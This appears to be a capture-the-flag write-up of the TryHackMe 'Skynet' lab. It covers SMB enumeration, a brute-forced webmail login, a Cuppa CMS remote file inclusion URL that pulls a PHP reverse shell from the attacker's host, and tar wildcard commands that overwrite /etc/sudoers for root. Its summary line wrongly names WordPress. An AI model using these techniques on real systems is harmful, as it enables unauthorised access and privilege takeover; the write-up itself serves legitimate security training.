---
title:  "TryHackMe - Skynet"
excerpt: "ss"
date: 2020-08-26

categories:
  - Write-Ups 
  - TryHackMe
tags:
  - Linux
  - SMB
  - Remote File Inclusion
---
## Introduction
![](/assets/images/thm-skynet/thumb.png)

Difficulty Rating: Easy

Creator: [@TryHackMe](https://tryhackme.com/p/tryhackme)

Skynet is a terminator themed linux machine. 

## Summary 

- WordPress Admin had a weak password.


## Tools Used

- Nmap
- Gobuster
- Dirsearch
- SMBMap
- SMBClient

## Enumeration


As always, we start with a port scan to reveal open ports on the network.

**Nmap**
```
root@kali:~# nmap -sC -sV 10.10.156.86
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 01:34 EDT
Nmap scan report for 10.10.156.86
Host is up (0.13s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP UIDL CAPA PIPELINING AUTH-RESP-CODE SASL RESP-CODES
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: IDLE more IMAP4rev1 have capabilities LITERAL+ listed LOGINDISABLEDA0001 post-login LOGIN-REFERRALS Pre-login OK SASL-IR ENABLE ID
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m57s, deviation: 2h53m12s, median: -3s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2020-08-26T00:34:25-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-26T05:34:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.54 seconds
```

Our Nmap scan reveals 5 ports are open:
 
- 22 (SSH - OpenSSH 7.2p2), 
- 80 (HTTP - Apache httpd 2.4.18) 
- 110 (POP3 - Dovecot pop3d)
- 139 (Samba - smbd 3.X - 4.X)
- 143 (IMAP - Dovecot imapd)
- 445 (Samba - smbd 4.3.11)

For now let's skip SSH on port 22 and enumerate http on port 80 some more.
![](INSERT HOMEPAGE)


All we have is search engine that does not send out any queries. Let's see if we can enumerate any directories on the webapp.
**GoBuster**
```
root@kali:~# gobuster dir -u http://10.10.156.86 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.156.86
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/26 01:52:07 Starting gobuster
===============================================================
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/config (Status: 301)
/ai (Status: 301)
/squirrelmail (Status: 301)
/server-status (Status: 403)
===============================================================
2020/08/26 02:01:07 Finished
===============================================================

```

**Dirsearch**
```
python3 dirsearch.py -u http://10.10.156.86 -e *


[01:53:10] 301 -  312B  - /admin  ->  http://10.10.156.86/admin/                                     
[01:53:14] 403 -  277B  - /admin/                       
[01:53:14] 403 -  277B  - /admin/?/login         
[01:53:14] 403 -  277B  - /admin/.htaccess      
[01:53:29] 301 -  313B  - /config  ->  http://10.10.156.86/config/                                                
[01:53:30] 403 -  277B  - /config/            
[01:53:31] 301 -  310B  - /css  ->  http://10.10.156.86/css/
[01:53:43] 200 -  523B  - /index.html                                                                          
[01:53:44] 301 -  309B  - /js  ->  http://10.10.156.86/js/                                              
[01:54:02] 403 -  277B  - /server-status                                                                
[01:54:02] 403 -  277B  - /server-status/
[01:54:06] 301 -  319B  - /squirrelmail  ->  http://10.10.156.86/squirrelmail/   
```
Most directories seem to be forbidden except for `squirrelmail`. Upon visiting `squirrelmail` we are prompted with the following login page:
![](/assets/images/thm-skynet/squirrelmail.png)

We don't have any creds at the moment, but we found an SMB server earlier. Let's enumerate the server and see if we can find any juicy info. Using `smbclient` we are able to view shares on the server.

**SMBClient**
```
root@kali:~# smbclient -L \\\\10.10.156.86\\
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```
> Note: No password to list share (Anonymous access allowed)

Let's continue to enumerate the SMB Shares by using `smbmap`

**SMBMap**
```
root@kali:~# smbmap -R -H 10.10.156.86
[+] Guest session       IP: 10.10.156.86:445    Name: 10.10.156.86                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        .\anonymous\*
        dr--r--r--                0 Wed Sep 18 00:41:20 2019    .
        dr--r--r--                0 Tue Sep 17 03:20:17 2019    ..
        fr--r--r--              163 Tue Sep 17 23:04:59 2019    attention.txt
        dr--r--r--                0 Wed Sep 18 00:42:16 2019    logs
        dr--r--r--                0 Wed Sep 18 00:40:06 2019    books
        .\anonymous\logs\*
        dr--r--r--                0 Wed Sep 18 00:42:16 2019    .
        dr--r--r--                0 Wed Sep 18 00:41:20 2019    ..
        fr--r--r--                0 Wed Sep 18 00:42:13 2019    log2.txt
        fr--r--r--              471 Wed Sep 18 00:41:59 2019    log1.txt
        fr--r--r--                0 Wed Sep 18 00:42:16 2019    log3.txt
		
        [...]
```

Now that we know which files might contain information and which shares they belong to. Using `smbclient` connect to the `anonymous` share and download `attention.txt` and the 3 `log*.txt` files.
**SMBClient**
![](/assets/images/thm-skynet/smbshare.png)
 
 `attention.txt`
 
 ```
 A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
 ```
 A note from an employee named `Miles Dyson`, could possibly be a sysadmin.
 
`log1.txt`
```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```
Looks like a list of possible password candidates. Let's save this and use it with `Burp Intruder` to brute-force a login to the `squirrelmail` page.

To use `Burp Intruder` we must first intercept the request. Then right-click it and `Send To Intruder`. Clear all the positions automatically set by burp and set a payload position on `secretkey`. Also we have to chang the `login_username` parameter to `milesdyson` since he is the only user we currently know of.
![](/assets/images/thm-skynet/burp.png)
 
Then paste the password candidate list we found from earlier:
![](/assets/images/thm-skynet/burp2.png)
 
Immediately we get a successful login,  which we can tell by the length on content in the reponse.
![](/assets/images/thm-skynet/burp3.png)

Upon login, we are presented with Miles Dyson's Inbox. Let's take a look at the email titled `Samba Password Reset`.
![](/assets/images/thm-skynet/inbox.png)
![](/assets/images/thm-skynet/samba.png)
 We have new credentials that we can use on the SMB Share! Let's run `smbmap` and see what more information we can gather.
 
 **SMBMap**
 ```
 root@kali:~# smbmap -u milesdyson -p ')s{A&2Z=F^n_E.B`' -R -H 10.10.156.86
 [+] IP: 10.10.156.86:445        Name: 10.10.156.86                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        .\print$\*
		[...]
         milesdyson                                              READ ONLY       Miles Dyson Personal Share
        .\milesdyson\*
        dr--r--r--                0 Tue Sep 17 05:05:47 2019    .
        dr--r--r--                0 Tue Sep 17 23:51:02 2019    ..
        fr--r--r--          5743095 Tue Sep 17 05:05:14 2019    Improving Deep Neural Networks.pdf
        fr--r--r--         12927230 Tue Sep 17 05:05:14 2019    Natural Language Processing-Building Sequence Models.pdf
        fr--r--r--         19655446 Tue Sep 17 05:05:14 2019    Convolutional Neural Networks-CNN.pdf
        dr--r--r--                0 Tue Sep 17 05:18:40 2019    notes
        fr--r--r--          4304586 Tue Sep 17 05:05:14 2019    Neural Networks and Deep Learning.pdf
        fr--r--r--          3531427 Tue Sep 17 05:05:14 2019    Structuring your Machine Learning Project.pdf
        .\milesdyson\notes\*
        dr--r--r--                0 Tue Sep 17 05:18:40 2019    .
        dr--r--r--                0 Tue Sep 17 05:05:47 2019    ..
        fr--r--r--            65601 Tue Sep 17 05:01:29 2019    3.01 Search.md
        fr--r--r--             5683 Tue Sep 17 05:01:29 2019    4.01 Agent-Based Models.md
        fr--r--r--             7949 Tue Sep 17 05:01:29 2019    2.08 In Practice.md
        fr--r--r--             3114 Tue Sep 17 05:01:29 2019    0.00 Cover.md
        fr--r--r--            70314 Tue Sep 17 05:01:29 2019    1.02 Linear Algebra.md
        fr--r--r--              117 Tue Sep 17 05:18:39 2019    important.txt
		[...]
 ```
 `important.txt` is sitting on Miles Dyson's share. Must be important so let's grab it using `smbclient` and view the contents of the file.
 
 `important.txt`
 ```
 root@kali:~# cat important.txt 

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
 ```
 Looks like we just found a new/hidden CMS. Since this is a whole new service, let's enumerate the directory again and see if we can find a login page or admin panel.
 
**Dirsearch**
```
root@kali:~/dirsearch# python3 dirsearch.py -u http://10.10.156.86/45kra24zxs28v3yd -e *
[...]
[03:14:05] 301 -  337B  - /45kra24zxs28v3yd/administrator  ->  http://10.10.156.86/45kra24zxs28v3yd/administrator/
[03:14:05] 403 -  277B  - /45kra24zxs28v3yd/administrator/.htaccess
[03:14:05] 200 -    5KB - /45kra24zxs28v3yd/administrator/   
[03:14:05] 200 -    5KB - /45kra24zxs28v3yd/administrator/index.php
[03:14:28] 200 -  418B  - /45kra24zxs28v3yd/index.html   
```
We found an interesting directory titled `/administrator/`, let's visit the url and see what it is.
![](/assets/images/thm-skynet/cuppa.png)
Seems to be a Cuppa CMS installation running. 

## Initial Access / User
A `searchsploit` search reveals that Cuppa CMS has a [Local/Remote File Inclusion Vulnerability](https://www.exploit-db.com/exploits/25971) which we can exploit, to gain a reverse shell. 
![](/assets/images/thm-skynet/searchsploit.png)

To set this up all we have to do is start a python server hosting in our directory that has our shell, then manipulate the `urlConfig` Parameter to point towards the PHP reverse shell. Once our reverse shell has been uploaded. Setup a netcat listener so we can gain a stable shell.
```
http://10.10.156.86/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.6.12.92/shell.php?
```
![](/assets/images/thm-skynet/rfi.png)
Now that we know our PHP code is on the machine, let's setup a listener and execute the script and gain a reverse shell.

```
http://10.10.156.86/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=shell.php
```
![](/assets/images/thm-skynet/initial.png)

Now that we have a shell, let's grab the user flag.
![](/assets/images/thm-skynet/user.png)

## Privilege Escalation (Root)

In Miles Dyson's home directory we notice a `backups` directory. Let's navigate there and check it out.
![](/assets/images/thm-skynet/backup.png)
There is a `backup.sh` that seems to be executing a tar wildcard. After some research it turns out we can exploit a wildcard vulnerability in tar that wil allow us to gain a shell as root. To do this we must create three files in the `/var/www/html` directory. The first file will be our script called `privesc.sh`, the next two files will be names of arguments that tar will pass to execute our script.[Int0x33](https://twitter.com/int0x33) has a great post on [Abusing Wildcards for Tar Argument Injection](https://medium.com/@int0x33/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e). 
```
$ echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
$ echo "" > "--checkpoint-action=exec=sh privesc.sh"
$ echo "" > --checkpoint=1
```
Now if we run an `ls` command on the directory we will see our files in place, ready to run.
![](/assets/images/thm-skynet/privesc1)

`privesc.sh`

```
echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers
```

Once all the files are in place. Execute the `backup.sh` and it will write to the sudoers file as the root user. Now our (www-data) user can execute a bash shell as root.
![](/assets/images/thm-skynet/root.png)

## Remediations

**SMB**
- Disable Anonymous Access 
- Don't store plain text credentials on a public network share

**Cuppa CMS**
- Update CMS to latest version

**Linux Server**
- Don't use wildcard's Tar. 